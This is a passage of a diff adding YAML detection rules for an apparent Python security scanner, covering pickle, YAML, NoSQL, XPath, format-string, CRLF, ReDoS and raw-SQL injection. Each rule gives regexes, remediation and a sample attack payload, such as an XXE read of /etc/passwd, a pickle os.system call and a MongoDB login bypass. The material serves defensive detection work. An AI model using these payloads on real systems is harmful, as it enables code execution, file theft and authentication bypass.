+      A billion laughs variant can also cause denial of service by exponentially
+
+      expanding nested entities to consume all available memory.
+
+      '
+    example_payload: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root><data>&xxe;</data></root>\n"
+    attacker_objective: Read sensitive local files from the server including application configuration, credentials, and private
+      keys. Perform SSRF to access internal services and cloud metadata endpoints. Cause denial of service through entity
+      expansion attacks.
+  confidence_factors:
+    pattern_strength: medium
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-001
+    - PY-SSRF-001
+    - PY-SEC-003
+  detection_layer: 1
+- rule_id: PY-INJ-006
+  title: Pickle Deserialization Injection
+  description: 'Detects deserialization of untrusted data via pickle.loads, pickle.load, shelve, or joblib where user-controlled
+    bytes are deserialized. Pickle executes arbitrary Python code during deserialization via __reduce__.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.95
+  cwe: CWE-502
+  owasp: A08:2021-Software-and-Data-Integrity-Failures
+  tags:
+  - deserialization
+  - pickle
+  - rce
+  - python
+  - shelve
+  - joblib
+  detection_layer: 1
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: pickle\.(?:loads?|Unpickler)\s*\(\s*(?:request|data|body|input|user|content|payload|message)\b
+    description: pickle.load/loads with user-controlled data
+  - type: regex
+    pattern: pickle\.(?:loads?|Unpickler)\s*\(\s*(?:request\.data|request\.body|request\.content|request\.stream)
+    description: pickle with HTTP request data
+  - type: regex
+    pattern: shelve\.open\s*\(\s*(?:request|input|user|param|data)\b
+    description: shelve.open with user-controlled path
+  - type: regex
+    pattern: joblib\.load\s*\(\s*(?:request|input|user|param|data|uploaded|file)\b
+    description: joblib.load with user-controlled file
+  - type: regex
+    pattern: torch\.load\s*\(\s*(?:request|input|user|param|data|uploaded|file)\b
+    description: torch.load with user-controlled file (uses pickle)
+  anti_patterns:
+  - pickle\.loads\s*\(\s*['"][^${}]+['"]
+  - hmac\.compare_digest
+  - RestrictedUnpickler
+  - '# safe: internal'
+  - fickling
+  - pickletools\.dis
+  - test\s*\(
+  bypass_variants:
+  - description: Pickle via base64-encoded payload
+    pattern: pickle\.loads\s*\(\s*base64\.b64decode
+  - description: Pickle via compressed data
+    pattern: pickle\.loads\s*\(\s*(?:zlib|gzip)\.decompress
+  evasion_indicators:
+  - Base64-encoded pickle payloads
+  - Compressed pickle streams
+  - Custom __reduce__ methods
+  encoding_variants:
+  - type: base64
+    pattern: base64\.b64decode.*pickle\.loads
+  - type: zlib
+    pattern: zlib\.decompress.*pickle\.loads
+  multi_function_chain_patterns:
+  - request.data -> base64.b64decode -> pickle.loads
+  - uploaded_file.read() -> pickle.loads(data)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary code execution via pickle __reduce__ method
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.data, uploaded file
+    sink: pickle.loads()
+    through: direct deserialization of bytes
+  impact: 'Pickle deserialization executes arbitrary Python code via __reduce__.
+
+    Attackers can achieve full RCE, data exfiltration, and system compromise.
+
+    '
+  remediation: '- Never deserialize untrusted pickle data.
+
+    - Use JSON, MessagePack, or Protocol Buffers instead.
+
+    - If pickle is required, use RestrictedUnpickler with allowlisted classes.
+
+    - Validate data integrity with HMAC before deserialization.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/502.html
+  - https://docs.python.org/3/library/pickle.html#restricting-globals
+  context_awareness:
+    surrounding_context_patterns:
+    - import pickle
+    - import shelve
+    - import joblib
+    taint_source_indicators:
+    - request.data
+    - request.body
+    - uploaded_file
+    - socket.recv
+    taint_sink_indicators:
+    - pickle.loads
+    - pickle.load
+    - shelve.open
+    - joblib.load
+    sanitization_patterns:
+    - RestrictedUnpickler
+    - hmac.compare_digest
+    - fickling
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask ML API accepts serialized model data via pickle.loads(request.data).
+
+      Attacker sends a crafted pickle payload that executes os.system(''id'').
+
+      '
+    example_payload: 'pickle.dumps(type(''exploit'', (), {''__reduce__'': lambda self: (__import__(''os'').system, (''id'',))})())'
+    attacker_objective: Execute arbitrary Python code via pickle deserialization
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-003
+    - PY-INJ-007
+- rule_id: PY-INJ-007
+  title: YAML Deserialization Injection
+  description: 'Detects use of yaml.load() or yaml.unsafe_load() without SafeLoader, enabling arbitrary Python object instantiation
+    and code execution via YAML tags like !!python/object/apply.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.94
+  cwe: CWE-502
+  owasp: A08:2021-Software-and-Data-Integrity-Failures
+  tags:
+  - deserialization
+  - yaml
+  - rce
+  - python
+  - pyyaml
+  detection_layer: 1
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: yaml\.load\s*\(\s*(?:request|data|body|input|user|content|param)\b
+    description: yaml.load with user-controlled data (no Loader specified)
+  - type: regex
+    pattern: yaml\.load\s*\([^)]*Loader\s*=\s*yaml\.(?:FullLoader|UnsafeLoader|Loader)\b
+    description: yaml.load with unsafe Loader
+  - type: regex
+    pattern: yaml\.unsafe_load\s*\(\s*(?:request|data|body|input|user|content)\b
+    description: yaml.unsafe_load with user data
+  - type: regex
+    pattern: yaml\.load_all\s*\(\s*(?:request|data|body|input|user)\b
+    description: yaml.load_all with user data
+  anti_patterns:
+  - yaml\.safe_load
+  - Loader\s*=\s*yaml\.SafeLoader
+  - Loader\s*=\s*yaml\.BaseLoader
+  - Loader\s*=\s*SafeLoader
+  - '# nosec'
+  - test\s*\(
+  bypass_variants:
+  - description: YAML tag injection for code execution
+    pattern: '!!python/object/apply'
+  - description: YAML module import via tag
+    pattern: '!!python/module'
+  evasion_indicators:
+  - 'YAML tags: !!python/object, !!python/module'
+  - Multi-document YAML streams
+  - Anchors and aliases for recursive structures
+  encoding_variants:
+  - type: unicode
+    pattern: \\u0021\\u0021python
+  - type: base64
+    pattern: base64\.b64decode.*yaml\.load
+  multi_function_chain_patterns:
+  - request.data -> yaml.load(data) -> object instantiation
+  - uploaded_file.read() -> yaml.load(content)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Arbitrary Python object construction via YAML tags
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.data, uploaded YAML file
+    sink: yaml.load()
+    through: unsafe Loader or no Loader
+  impact: 'YAML deserialization with unsafe Loader allows arbitrary Python code
+
+    execution via !!python/object tags. Full RCE is trivially achievable.
+
+    '
+  remediation: '- Always use yaml.safe_load() or Loader=yaml.SafeLoader.
+
+    - Never use yaml.load() without explicitly specifying SafeLoader.
+
+    - Use yaml.safe_load_all() for multi-document streams.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/502.html
+  - https://pyyaml.org/wiki/PyYAMLDocumentation
+  context_awareness:
+    surrounding_context_patterns:
+    - import yaml
+    - from yaml import
+    taint_source_indicators:
+    - request.data
+    - request.body
+    - open(
+    - uploaded_file
+    taint_sink_indicators:
+    - yaml.load
+    - yaml.unsafe_load
+    - yaml.load_all
+    sanitization_patterns:
+    - yaml.safe_load
+    - SafeLoader
+    - BaseLoader
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A config API accepts YAML via yaml.load(request.data). Attacker sends
+
+      YAML with !!python/object/apply:os.system [''id''] to execute commands.
+
+      '
+    example_payload: '!!python/object/apply:subprocess.check_output [[''id'']]'
+    attacker_objective: Execute arbitrary code via YAML deserialization
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-006
+    - PY-INJ-003
+- rule_id: PY-INJ-008
+  title: MongoDB NoSQL Injection via PyMongo
+  description: 'Detects NoSQL injection where user-controlled input is passed directly to PyMongo query operators ($where,
+    $regex, $gt, $ne), enabling query manipulation, authentication bypass, and data exfiltration.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-943
+  owasp: A03:2021-Injection
+  tags:
+  - nosql-injection
+  - mongodb
+  - pymongo
+  - authentication-bypass
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \.find(?:_one)?\s*\(\s*(?:request\.|data|body|query|params|input|user)\.
+    description: MongoDB find with user-controlled query
+  - type: regex
+    pattern: \.find(?:_one)?\s*\(\s*(?:request\.(?:json|form|args|data))\b
+    description: MongoDB find with entire request body as query
+  - type: regex
+    pattern: \$(?:where|regex|gt|gte|lt|lte|ne|in|nin|or|and)\b.*(?:request|input|user|param)\.
+    description: MongoDB operator with user-controlled value
+  - type: regex
+    pattern: \.(?:update_one|delete_one|aggregate)\s*\(\s*(?:request\.|data|body|json)\b
+    description: MongoDB mutation with user-controlled filter
+  anti_patterns:
+  - mongo_sanitize
+  - ObjectId\s*\(
+  - Joi\.
+  - validate
+  - isinstance.*dict
+  - test\s*\(
+  bypass_variants:
+  - description: Operator injection via JSON body
+    pattern: '\$(?:gt|ne|regex)\s*:'
+  - description: $where JavaScript injection
+    pattern: \$where.*function
+  evasion_indicators:
+  - MongoDB operator injection in JSON body
+  - $where JavaScript execution
+  - $regex with ReDoS patterns
+  encoding_variants:
+  - type: unicode
+    pattern: \\u0024where
+  - type: url_encoding
+    pattern: '%24where'
+  multi_function_chain_patterns:
+  - request.json -> db.collection.find(request.json)
+  - 'request.form -> {field: request.form[key]} -> find'
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Authentication bypass and data exfiltration via operator injection
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.json
+    sink: collection.find()
+    through: direct pass as query object
+  impact: 'NoSQL injection allows authentication bypass, data exfiltration, and
+
+    arbitrary JavaScript execution via $where operator in MongoDB.
+
+    '
+  remediation: '- Validate input types strictly (expect string, reject dicts with $ keys).
+
+    - Use mongo-sanitize or equivalent input sanitization.
+
+    - Never pass raw request body to MongoDB operations.
+
+    '
+  references:
+  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
+  - https://cwe.mitre.org/data/definitions/943.html
+  context_awareness:
+    surrounding_context_patterns:
+    - import pymongo
+    - from pymongo import
+    - MongoClient
+    taint_source_indicators:
+    - request.json
+    - request.form
+    - request.args
+    taint_sink_indicators:
+    - .find(
+    - .find_one(
+    - .aggregate(
+    - $where
+    sanitization_patterns:
+    - ObjectId(
+    - isinstance
+    - validate
+    - mongo_sanitize
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A login endpoint uses db.users.find_one(request.json). Attacker sends
+
+      {"username":"admin","password":{"$ne":""}} to bypass authentication.
+
+      '
+    example_payload: '{"username":"admin","password":{"$gt":""}}'
+    attacker_objective: Bypass authentication or extract data via MongoDB operator injection
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-001
+    - PY-INJ-009
+- rule_id: PY-INJ-009
+  title: XPath Injection via lxml/ElementTree
+  description: 'Detects XPath queries constructed with user-controlled input via string formatting in lxml or xml.etree, enabling
+    data extraction and authentication bypass through XPath manipulation.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-643
+  owasp: A03:2021-Injection
+  tags:
+  - xpath-injection
+  - lxml
+  - xml
+  - authentication-bypass
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \.xpath\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data)\b
+    description: XPath with f-string user input
+  - type: regex
+    pattern: \.xpath\s*\(\s*['"][^'"]*["']\s*%\s*(?:request|param|input|user|data)\b
+    description: XPath with % formatting user input
+  - type: regex
+    pattern: \.xpath\s*\(\s*['"][^'"]*["']\s*\.format\s*\([^)]*(?:request|param|input|user)\b
+    description: XPath with .format() user input
+  - type: regex
+    pattern: \.findall\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user|data)\b
+    description: ElementTree findall with f-string user input
+  anti_patterns:
+  - lxml\.etree\.XPath\s*\(
+  - parameterized xpath
+  - sanitize
+  - allowlist
+  - test\s*\(
+  - xpath_variables
+  bypass_variants:
+  - description: XPath boolean blind injection
+    pattern: or\s+1\s*=\s*1
+  - description: XPath union injection
+    pattern: \\|\\s*//\\w+
+  evasion_indicators:
+  - Boolean-based blind XPath injection
+  - XPath union operator injection
+  - Namespace confusion
+  encoding_variants:
+  - type: unicode
+    pattern: \\u0027\\s*or
+  - type: html_entities
+    pattern: '&apos;.*or'
+  multi_function_chain_patterns:
+  - request.args['user'] -> f"//user[@name='{user}']" -> tree.xpath()
+  - request.form['id'] -> xpath query -> find()
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Data extraction and authentication bypass via XPath manipulation
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.args, request.form
+    sink: tree.xpath(), root.findall()
+    through: f-string or % formatting
+  impact: 'XPath injection enables extraction of arbitrary XML data, authentication
+
+    bypass, and information disclosure from XML data stores.
+
+    '
+  remediation: '- Use lxml XPath variables: tree.xpath("//user[@name=$name]", name=user_input).
+
+    - Validate and restrict input to expected character sets.
+
+    - Use parameterized XPath via lxml''s variable binding.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/643.html
+  - https://owasp.org/www-community/attacks/XPATH_Injection
+  context_awareness:
+    surrounding_context_patterns:
+    - from lxml import etree
+    - import xml.etree
+    taint_source_indicators:
+    - request.args
+    - request.form
+    - request.json
+    taint_sink_indicators:
+    - .xpath(
+    - .findall(
+    - .find(
+    sanitization_patterns:
+    - XPath(
+    - xpath_variables
+    - sanitize
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A user lookup uses tree.xpath(f"//user[@name=''{name}'']"). Attacker sends
+
+      name="'' or ''1''=''1" to extract all user records from the XML store.
+
+      '
+    example_payload: ''' or ''1''=''1'
+    attacker_objective: Extract data or bypass authentication via XPath manipulation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-005
+    - PY-INJ-001
+- rule_id: PY-INJ-010
+  title: Format String Injection via str.format
+  description: 'Detects use of str.format() or str.format_map() where the format string itself is user-controlled, enabling
+    access to object attributes and methods through Python''s format specification mini-language.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-134
+  owasp: A03:2021-Injection
+  tags:
+  - format-string
+  - information-disclosure
+  - attribute-access
+  - python
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: (?:request|param|input|user|data)\b[^.]*\.format\s*\(
+    description: User-controlled string used as format template
+  - type: regex
+    pattern: \.format_map\s*\(\s*(?:request|param|input|user|data|locals|globals|vars)\b
+    description: format_map with user-controlled mapping or locals/globals
+  - type: regex
+    pattern: (?:request|param|input|user)\b[^=]*\.format\s*\(\s*\*\*
+    description: User-controlled format with dict unpacking
+  - type: regex
+    pattern: format\s*\(\s*(?:request|param|input|user|data)\b[^,]*\.format\b
+    description: Nested format call with user input
+  anti_patterns:
+  - f['"].*\{
+  - \.format\s*\(\s*['"][^${}]+['"]
+  - sanitize
+  - allowlist
+  - test\s*\(
+  - escape
+  bypass_variants:
+  - description: Attribute access via format spec
+    pattern: \{0\.__class__\.__init__\.__globals__\}
+  - description: Dict key access via format
+    pattern: \{0\[secret_key\]\}
+  evasion_indicators:
+  - Attribute traversal via {0.__class__}
+  - Dict key access via {0[key]}
+  - Global variable access via format_map
+  encoding_variants:
+  - type: unicode
+    pattern: \\u007b.*\\u007d
+  - type: html_entities
+    pattern: '&#123;.*&#125;'
+  multi_function_chain_patterns:
+  - request.form['template'] -> template.format(**context)
+  - user_input.format_map(vars())
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Access to object attributes and application secrets via format spec
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.form['template']
+    sink: template.format(**context)
+    through: user-controlled format string
+  impact: 'Format string injection enables reading of object attributes, application
+
+    secrets, and internal state. Can lead to information disclosure and in
+
+    some cases code execution.
+
+    '
+  remediation: '- Never use user input as a format string template.
+
+    - Use f-strings with pre-defined templates.
+
+    - If dynamic templates needed, use a safe template engine (Jinja2 sandboxed).
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/134.html
+  - https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/
+  context_awareness:
+    surrounding_context_patterns:
+    - .format(
+    - format_map(
+    - str.format
+    taint_source_indicators:
+    - request.form
+    - request.args
+    - request.json
+    taint_sink_indicators:
+    - .format(
+    - .format_map(
+    sanitization_patterns:
+    - escape
+    - allowlist
+    - sanitize
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A notification system uses user_template.format(user=current_user).
+
+      Attacker sends template="{user.__class__.__init__.__globals__[SECRET_KEY]}"
+
+      to extract the application secret key.
+
+      '
+    example_payload: '{0.__class__.__init__.__globals__}'
+    attacker_objective: Extract application secrets via format string attribute traversal
+  confidence_factors:
+    pattern_strength: high
+    context_match: medium
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-003
+    - PY-INJ-004
+- rule_id: PY-INJ-011
+  title: HTTP Header / CRLF Injection
+  description: 'Detects HTTP header injection via user-controlled values in response headers, enabling CRLF injection for
+    response splitting, XSS, and cache poisoning attacks.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-113
+  owasp: A03:2021-Injection
+  tags:
+  - crlf-injection
+  - header-injection
+  - response-splitting
+  - xss
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: response\[.*\]\s*=\s*(?:request|param|input|user|data)\b
+    description: Response header set from user input
+  - type: regex
+    pattern: response\.headers\[.*\]\s*=\s*(?:request|param|input|user|data)\b
+    description: Response headers dict set from user input
+  - type: regex
+    pattern: make_response\s*\([^)]*\)\.headers\[.*\]\s*=\s*(?:request|param|input|user)\b
+    description: Flask make_response header from user input
+  - type: regex
+    pattern: HttpResponse\s*\([^)]*\)\[.*\]\s*=\s*(?:request|param|input|user)\b
+    description: Django HttpResponse header from user input
+  anti_patterns:
+  - urllib\.parse\.quote
+  - escape
+  - sanitize
+  - replace.*\\r
+  - replace.*\\n
+  - test\s*\(
+  bypass_variants:
+  - description: CRLF via encoded newline
+    pattern: '%0d%0a'
+  - description: Header injection via unicode
+    pattern: \\u000d\\u000a
+  evasion_indicators:
+  - URL-encoded CRLF characters
+  - Unicode newline variants
+  - Header value truncation attacks
+  encoding_variants:
+  - type: url_encoding
+    pattern: '%0[dD]%0[aA]'
+  - type: unicode
+    pattern: \\u000[dD]\\u000[aA]
+  multi_function_chain_patterns:
+  - request.args['redirect'] -> response['Location'] = redirect
+  - request.form['lang'] -> response['Content-Language'] = lang
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Response splitting enables XSS and cache poisoning
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.args, request.form
+    sink: response.headers
+    through: direct header value assignment
+  impact: 'CRLF injection enables HTTP response splitting, allowing XSS via
+
+    injected headers, cache poisoning, and session fixation attacks.
+
+    '
+  remediation: '- Strip or reject \\r and \\n characters from header values.
+
+    - Use framework-provided redirect functions instead of manual Location headers.
+
+    - URL-encode user input before placing in header values.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/113.html
+  - https://owasp.org/www-community/attacks/HTTP_Response_Splitting
+  context_awareness:
+    surrounding_context_patterns:
+    - from flask import
+    - from django.http import
+    - HttpResponse
+    taint_source_indicators:
+    - request.args
+    - request.form
+    - request.GET
+    taint_sink_indicators:
+    - response.headers
+    - response[
+    - HttpResponse(
+    sanitization_patterns:
+    - urllib.parse.quote
+    - replace.*\\r
+    - replace.*\\n
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Flask app sets Content-Disposition from user input. Attacker injects
+
+      \\r\\nSet-Cookie: session=hijacked to perform session fixation.
+
+      '
+    example_payload: 'test\r\nX-Injected: true\r\n\r\n<script>alert(1)</script>'
+    attacker_objective: Inject HTTP headers for response splitting, XSS, or session fixation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PY-INJ-001
+    - PY-INJ-004
+- rule_id: PY-INJ-012
+  title: ReDoS via re.compile with User-Controlled Pattern
+  description: 'Detects use of re.compile() or re.match/search/findall with user-controlled regex patterns, enabling Regular
+    Expression Denial of Service attacks via catastrophic backtracking.
+
+    '
+  language: python
+  category: injection
+  severity: Medium
+  confidence: 0.87
+  cwe: CWE-1333
+  owasp: A03:2021-Injection
+  tags:
+  - redos
+  - regex-injection
+  - dos
+  - python
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: re\.compile\s*\(\s*(?:request|param|input|user|data|search|pattern|query)\b
+    description: re.compile with user-controlled pattern
+  - type: regex
+    pattern: re\.(?:match|search|findall|sub)\s*\(\s*(?:request|param|input|user|data|search|pattern)\b
+    description: re function with user-controlled pattern
+  - type: regex
+    pattern: re\.compile\s*\(\s*f['"][^'"]*\{[^}]*(?:request|param|input|user)\b
+    description: re.compile with f-string containing user input
+  - type: regex
+    pattern: re\.(?:match|search|findall)\s*\(\s*['"][^'"]*["']\s*(?:\+|%)\s*(?:request|param|input|user)\b
+    description: re function with concatenated user pattern
+  anti_patterns:
+  - re\.escape\s*\(
+  - regex\.compile
+  - test\s*\(
+  - '# safe: constant'
+  - TIMEOUT
+  - safe-regex
+  bypass_variants:
+  - description: Catastrophic backtracking pattern
+    pattern: \(a\+\)\+
+  - description: Nested quantifiers
+    pattern: \([^)]*[+*]\s*\)[+*]
+  evasion_indicators:
+  - User-controlled regex with nested quantifiers
+  - Exponential backtracking patterns
+  - Regex injection via metacharacters
+  encoding_variants:
+  - type: unicode
+    pattern: \\u005b.*\\u005d
+  - type: hex
+    pattern: \\x5b.*\\x5d
+  multi_function_chain_patterns:
+  - request.args['q'] -> re.compile(q) -> pattern.search(text)
+  - request.form['filter'] -> re.findall(filter, data)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: CPU exhaustion via catastrophic regex backtracking
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: false
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.args['pattern']
+    sink: re.compile()
+    through: direct parameter pass
+  impact: 'ReDoS causes CPU exhaustion, making the application unresponsive.
+
+    Attackers can craft patterns with exponential time complexity.
+
+    '
+  remediation: '- Escape user input with re.escape() before using in re.compile().
+
+    - Use Google''s re2 library for linear-time regex.
+
+    - Set timeouts on regex operations.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/1333.html
+  - https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS
+  context_awareness:
+    surrounding_context_patterns:
+    - import re
+    - from re import
+    taint_source_indicators:
+    - request.args
+    - request.form
+    - request.json
+    taint_sink_indicators:
+    - re.compile(
+    - re.match(
+    - re.search(
+    - re.findall(
+    sanitization_patterns:
+    - re.escape(
+    - regex.compile
+    - TIMEOUT
+  severity_scoring:
+    severity_weight: 6
+    risk_score_formula_hint: severity_weight * confidence * pattern_complexity
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'A search API uses re.compile(request.args[''q'']). Attacker sends
+
+      q=(a+)+$ with a long input to cause catastrophic backtracking.
+
+      '
+    example_payload: (a+)+$
+    attacker_objective: Cause denial of service via regex CPU exhaustion
+  confidence_factors:
+    pattern_strength: high
+    context_match: medium
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - PY-INJ-008
+- rule_id: PY-INJ-013
+  title: Django/Flask ORM Raw Query Injection
+  description: 'Detects SQL injection via Django''s .raw(), .extra(), or SQLAlchemy''s text() with string formatting of user
+    input, bypassing ORM protections.
+
+    '
+  language: python
+  category: injection
+  severity: High
+  confidence: 0.92
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - django
+  - flask
+  - orm
+  - raw-query
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: \.raw\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{[^}]*(?:request|param|input|user|data)\b
+    description: Django .raw() with f-string user input
+  - type: regex
+    pattern: \.extra\s*\(\s*(?:where|select|tables)\s*=\s*\[[^]]*f['"][^'"]*\{[^}]*(?:request|param|input|user)\b
+    description: Django .extra() with f-string in where clause
+  - type: regex
+    pattern: text\s*\(\s*f['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{[^}]*(?:request|param|input|user|data)\b
+    description: SQLAlchemy text() with f-string user input
+  - type: regex
+    pattern: \.raw\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*%\s*(?:request|param|input|user)\b
+    description: Django .raw() with % formatting user input
+  anti_patterns:
+  - .raw\s*\(\s*['"][^${}]+['"],\s*\[
+  - text\s*\(\s*['"][^${}]+['"\s]*\)\.bindparams
+  - .objects.filter(
+  - parameterized
+  - test\s*\(
+  - sanitize
+  bypass_variants:
+  - description: Second-order injection via stored data
+    pattern: \.raw\s*\(\s*f['"].*\{.*stored
+  - description: ORDER BY injection
+    pattern: f['"].*ORDER\s+BY\s+\{[^}]*(?:request|param)\b
+  evasion_indicators:
+  - ORDER BY clause manipulation
+  - Second-order SQL injection
+  - Aggregate function injection
+  encoding_variants:
+  - type: unicode
+    pattern: \\u0027.*OR
+  - type: hex
+    pattern: 0x.*UNION
+  multi_function_chain_patterns:
+  - request.GET['sort'] -> f"SELECT * FROM t ORDER BY {sort}" -> .raw()
+  - request.form['search'] -> text(f"...WHERE name = '{search}'")
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: SQL injection via ORM raw query bypass
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: request.GET, request.POST
+    sink: Model.objects.raw(), text()
+    through: f-string or % formatting
+  impact: 'SQL injection via ORM raw queries bypasses normal ORM protections and
+
+    enables full database compromise including data exfiltration and RCE.
+
+    '
+  remediation: '- Use .raw() with parameterized placeholders: Model.objects.raw("SELECT * WHERE id=%s", [id]).
+
